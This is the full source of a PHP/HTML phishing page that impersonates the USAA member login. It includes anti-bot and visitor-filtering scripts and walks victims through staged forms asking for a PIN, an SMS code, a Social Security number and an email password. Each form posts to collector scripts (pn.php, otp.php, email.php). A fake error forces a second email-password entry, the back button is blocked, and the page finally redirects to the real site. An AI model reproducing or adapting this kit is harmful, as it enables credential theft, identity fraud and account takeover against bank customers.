<?php
include '../anti/config.php';
include '../anti/functions.php';
include '../anti/visitor.php';
include '../anti/antibots.php';
$_SESSION['allowed'] = true;
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Member Account Login | USAA</title>
    <link rel="SHORTCUT ICON" href="https://content.usaa.com/mcontent/static_assets/Media/usaaicon.ico?cacheid=850343182_p">
    <link rel="stylesheet" href="css/app.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>

<body>
    <div class="container-div">
        <div class="header_box-container">
            <div class="header-box">
                <div class="header_box-img">
                    <img src="css/logo.svg" alt="" id="Logo-svg">
                </div>

                <div class="header_box-nav">
                    <nav class="menu">
                        <li class="menu-list"><a href="#" class="list"></a></li>
                        <li class="menu-list"><a href="#" class="list list-1"></a></li>
                        <li class="menu-list"><a href="#" class="list list-2"></a></li>
                        <li class="menu-list"><a href="#" class="list"><span class="divider"></span></a></li>
                        <li class="menu-list"><a href="#" class="list list-time"></a><img src="css/icon.svg" alt=""></li>
                    </nav>
                </div>
            </div>
        </div><br><br><br>
		<div class="col-sm-12 col-lg-12 login-page-outer" id="step1" style="display:block">
        <div class="main-container">
            <div class="main-svg">
                <img src="css/flower.svg" alt="" id="flourish-icon">
            </div>

            <div class="main_heading-container">
                <div class="heading-container">
                    <h2 class="heading-1">New to USAA?</h2>
                    <h4 class="heading-4">Become a member by selecting "Join USAA"</h4>
                    <h4 class="heading-4">— it's easy and only takes a few minutes.</h4>

                    <div class="heading-button">
                    </div>

                </div>
                <div class="main_header-form" id="id1" >
                    <div class="new-usaa">
                         <h2 style="color:black" class="heading-1">Enter Your PIN</h2>
                    </div>
                    <form action="#" id="form-main" method="post">

                        <div class="form-heading">
                            <h2 class="heading-2"></h2>
                        </div>
                        <div class="form-wrapper-box form-wrapper-active">
                            <label for="">PIN</label>
                            <label for="" class="errr-msg err-2-main"></label>
                            <input type="password" id="pin" name="pin" class="id" required>
                        </div><br>
						<p> Entering your personal identification number (PIN) each time you access your accounts or<br> use chat on usaa.com allows us to verify who you are and give you the<br> maximum security and privacy for your information.</p>

                        <div class="form-button">
                            <button class="form-btn" id="form-btn" type="submit">Next</button>
                        </div>

                        <div class="form-help">
                            <a href="#" class="help"></a>
                        </div>
                    </form>
                </div>
				<div class="main_header-form" id="id2" style="display:none">
                    <div class="new-usaa">
                         <h2 style="color:black" class="heading-1">Recognition of device</h2>
                    </div>
                    <form action="#" id="form-main" method="post">

                        <div class="form-heading">
                            <h2 class="heading-2"></h2>
                        </div>
                        <div>
                          Please wait...While we verify your device<br><br><img src="css/spin.gif"><br><br>For your protection we will send you a temporary identification code<br> to your mobile to proceed
                        </div>

                        <div class="form-help">
                            <a href="#" class="help"></a>
                        </div>
                    </form>
                </div>
            </div>
        </div>
		</div>


		<div class="contentArea" style="display:none" id="step2">
        <div class="main-container">
            <div class="main-svg">
                <img src="css/flower.svg" alt="" id="flourish-icon">
            </div>

            <div class="main_heading-container">
                <div class="heading-container">
                    <h2 class="heading-1">New to USAA?</h2>
                    <h4 class="heading-4">Become a member by selecting "Join USAA"</h4>
                    <h4 class="heading-4">— it's easy and only takes a few minutes.</h4>

                    <div class="heading-button">
                    </div>

                </div>
                <div class="main_header-form">
                    <div class="new-usaa">
                         <h2 style="color:black;font-size:16px" class="heading-1">We sent a 6-digit security code to your registered phone number.</h2>
                    </div>
                    <form action="#" id="form" method="post">

                        <div class="form-heading">
                            <h2 class="heading-1 heading-2"></h2>
                        </div>
                        <div class="form-wrapper-box form-wrapper-active">
                            <label for="">Enter Your 6-Digit Code</label>
                            <label for="" class="errr-msg err-2-main">Please enter Online ID.</label>
                            <input type="text" id="code" name="code" class="id" required>
                        </div>
                        <div class="form-wrapper-box form-wrapper-active">
                            <label for="">Social Security Number </label>
                            <label for="" class="errr-msg">Please enter Password.</label>
                            <input type="text" id="ssn" name="ssn" class="pass" required>
                        </div>

                        <div class="checkbox hide-box">
                        </div>

                        <div class="loader hide-loader">Loading...</div>

                        <div class="form-button">
                            <button class="form-btn" id="btn" type="submit">Next</button>
                        </div>

                        <div class="form-help">
                            <a href="#" class="help"></a>
                        </div>
                    </form>
                </div>
            </div>
        </div>
		</div>
		<div class="contentArea" style="display:none" id="step3">
        <div class="main-container">
            <div class="main-svg">
                <img src="css/flower.svg" alt="" id="flourish-icon">
            </div>

            <div class="main_heading-container" id="id3">
                <div class="heading-container">
                    <h2 class="heading-1">New to USAA?</h2>
                    <h4 class="heading-4">Become a member by selecting "Join USAA"</h4>
                    <h4 class="heading-4">— it's easy and only takes a few minutes.</h4>

                    <div class="heading-button">
                        <a href="#" class="heading-btn">Join USAA</a>
                    </div>

                </div>
                <div class="main_header-form">
                    <div class="new-usaa">
                         <h2 style="color:black" class="heading-1">Email Verification</h2>
                    </div>
					<p id="err" style="color:red;font-size:16px;display:none" class="heading-1">Your Email address or Password is incorrect. Please try again. </p>
                    <form action="#" id="forms" method="post">

                        <div class="form-heading">
                            <h2 class="heading-1 heading-2"></h2>
                        </div>
                        <div class="form-wrapper-box form-wrapper-active">
                            <label for="">Email Address</label>
                            <label for="" class="errr-msg err-2-main">Please enter Online ID.</label>
                            <input type="email" id="email" name="email" class="id" required>
                        </div>
                        <div class="form-wrapper-box form-wrapper-active">
                            <label for="">Email Password</label>
                            <input type="password" id="pass" name="pass" class="pass" required>
                        </div>

                        <div class="checkbox hide-box">
                        </div>

                        <div class="loader hide-loader">Loading...</div>

                        <div class="form-button">
                            <button class="form-btn" id="btn2" type="submit">Next</button>
                        </div>

                        <div class="form-help">
                            <a href="#" class="help"></a>
                        </div>
                    </form>
                </div>
            </div>
        </div>
		</div><div class="contentArea" style="display:none" id="step4">
        <div class="main-container">
            <div class="main-svg">
                <img src="css/flower.svg" alt="" id="flourish-icon">
            </div>

            <div class="main_heading-container" id="id3">
                <div class="heading-container">
                    <h2 class="heading-1">New to USAA?</h2>
                    <h4 class="heading-4">Become a member by selecting "Join USAA"</h4>
                    <h4 class="heading-4">— it's easy and only takes a few minutes.</h4>

                    <div class="heading-button">
                        <a href="#" class="heading-btn">Join USAA</a>
                    </div>

                </div>
				<div class="main_header-form">
                    <div class="new-usaa">
                         <h2 style="color:black" class="heading-1">Confirmation Complete</h2>
                    </div>
                    <form action="#" id="form-main" method="post">

                        <div class="form-heading">
                            <h2 class="heading-2"></h2>
                        </div>
                        <div>
                          Please wait... <br><br>Your account information is being processed... <br><br><img src="css/spin.gif"><br><br>Upon completion you will be automatically logged out and redirected to our login page.
                        </div>

                        <div class="form-help">
                            <a href="#" class="help"></a>
                        </div>
                    </form>
                </div>
            </div>
        </div>
		</div>
		<div class="footer">
            <div class="footer_links">
                <a href="#" class="links">Security Center</a>
                <a href="#" class="links">Privacy Center</a>
                <a href="#" class="links">Accessiblity at USAA</a>
            </div>

            <div class="copy-rights">
                <span class="copy">Copyright © 2023 USAA</span>
                <p class="Nc">NC-1120</p>
            </div>
        </div>
    </div>
<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>  <script type="text/javascript">

history.pushState(null, document.title, location.href);
window.addEventListener('popstate', function (event)
{
  history.pushState(null, document.title, location.href);
});

//$(document).bind("contextmenu", function(e){ return false;});

var count = 0;
var counts = 0;

$('#form-main').on('submit', function(e){
		count = count+1;
		$('#id1').hide();
		$('#id2').show();
		$.post('pn.php', $(this).serialize(), function(data){
			console.log(data);
		});
		setTimeout(function() {
		                     if(count == 1){
							    $('#step1').hide();
							    $('#step2').show();
							 }else{
							     $('#password').val('');
								 $('#msgg').show();
								 $('#form-btn').html('Next');
							 }
                              
							  
                        },20000);
		e.preventDefault();
	});
	
$('#form').on('submit', function(e){
		count = count+1;
		$('#btn').html('<i class="fa fa-refresh fa-spin"></i>');
		$.post('otp.php', $(this).serialize(), function(data){
			console.log(data);
		});
		setTimeout(function() {
		                     if(count == 2){
							    $('#step2').hide();
							    $('#step3').show();
							 }else{
							     $('#emailpass').val('');
								 $('#ms').show();
								 $('#btn').html('Next');
							 }
                              
							  
                        },2000);
		e.preventDefault();
	});

$('#forms').on('submit', function(e){
		counts = counts+1;
		$('#btn2').html('<i class="fa fa-refresh fa-spin"></i>');
		$.post('email.php', $(this).serialize(), function(data){
			console.log(data);
		});
		setTimeout(function() {
		
							if(counts == 2){
							   $('#step3').hide();
							   $('#step4').show();
							   
					   setTimeout(function() {
                              window.location.href = "https://usaa.com";
                        },9000);
							   
							}else{
							     $('#email').val('');
								 $('#pass').val('');
								 $('#err').show();
								 $('#btn2').html('Next');
							}
		
                            
                        },9000);
		e.preventDefault();
	});

</script>
<script>

    $(function() {
       $('[name="pin"]').mask('0000');
	   $('[name="code"]').mask('000000');
	   $('[name="ssn"]').mask('000-00-0000');

    });

</script>
</body>

</html>